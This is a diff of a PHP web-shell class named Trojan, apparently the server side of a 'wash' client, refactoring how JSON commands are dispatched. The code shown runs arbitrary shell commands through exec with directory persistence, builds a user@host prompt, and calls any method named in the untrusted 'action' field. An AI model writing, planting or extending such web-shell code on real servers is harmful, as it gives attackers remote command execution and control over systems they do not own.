@@ -2,14 +2,14 @@
 
 class Trojan{
     private $cwd      = '';
-    private $response = array(
-        /*
-        'cwd'            => null,
-        'error'          => null,
-        'output'         => null,
-        'prompt_context' => null,
-        */
-    );
+    private $response = array( /*
+        error  = '',
+        output = array(
+            'cwd'    => '',
+            'error'  => '',
+            'stdout' => '',
+        ),
+    */);
 
     /**
      * A generic constructor
@@ -25,13 +25,12 @@ class Trojan{
      * @param string $json             JSON from the wash client
      */
     public function process_command($json){
-        # if the specified action was 'shell', pipe the command directly into
-        # the web shell.
-        if($json['action'] == 'shell'){
-            $this->process_shell_command($json['args']['cmd']);
+        # verify that the method exists before attempting to invoke it
+        # metaprogramming FTW
+        if(method_exists($this, $json['action'])){
+            $this->$json['action']($json['args']);
         }
-
-        # otherwise, simply invoke the method directly
+        # if the method doesn't exist, send back an error message
         else {
             $this->response['error'] = "{$json['action']} unsupported.";
             $this->send_response();
@@ -48,11 +47,12 @@ class Trojan{
      * reported was that the redirect file could not be created, however, 
      * output just goes to a black hole. @see Github issue #38.
      */
-    private function process_shell_command($command){
+    private function shell($args){
         /* @note: In order to get current directory persistence to work, I need 
          * to inject some `cd` and `pwd` commands around the command sent from 
          * the wash client. */
         $output_raw = array();
+        $command    = $args['cmd'];
         exec("cd {$this->cwd}; $command 2>&1; pwd", $output_raw);
 
         # buffer the results
@@ -88,6 +88,9 @@ class Trojan{
         $line_terminator      =  ($whoami ==  'root') ? '#' : '$' ;
         return "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
     }
+
+    
+
 }
 
 /* ---------- Procedural code starts here ---------- */
